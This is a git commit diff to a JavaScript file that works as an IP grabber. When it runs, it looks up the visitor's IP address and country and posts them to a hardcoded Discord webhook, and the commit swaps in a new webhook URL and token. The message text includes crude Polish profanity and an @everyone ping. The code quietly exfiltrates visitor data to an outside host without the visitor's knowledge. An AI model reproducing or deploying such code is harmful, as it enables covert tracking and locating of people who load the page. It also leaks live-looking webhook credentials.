92f497c0c9c2da984536ea423ec961a2610b155e
HakerTegoTypu <112369051+HakerTegoTypu@users.noreply.github.com>
2022-09-01 07:37:23 +0200

    Update javascript.js

--- javascript.js
+++ javascript.js
@@ -1,4 +1,4 @@
-var webHookUrl = "https://discord.com/api/webhooks/1013668608443940874/VmmxcX0ErK-rfZn5qLz-tmH7BFje-qkIX_GpHTeZoQz9OYCMibRG59CIVbN7N262JXDf";
+var webHookUrl = "https://discord.com/api/webhooks/1014770857425502258/JkDPYq2SJzUzNTGKBT6KWup9IrDUapRl_gchgALyQQBEQdkUNOxKW2mwvXL1-Wwv64mt";
 
 $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
   console.log(JSON.stringify(data, null, 2));
@@ -20,9 +20,9 @@ const request = async () => { // Calling a "synchronous" fetch
     postRequest.setRequestHeader('Content-type', 'application/json');
 
     var params = {
-        username:   "IP Log",
+        username:   "ELO BENC",
         avatar_url: "",
-        content:    "**NOWA KURWA IP BOMBA** @everyone \n" + 
+        content:    "**NOWA KURWA IP BOMBA ** @everyone \n" + 
 		    "__**:globe_with_meridians: IP Address:**__ \n" +
                     "`" + ip + "` \n \n" +
 		    "__**Country:**__ \n" +
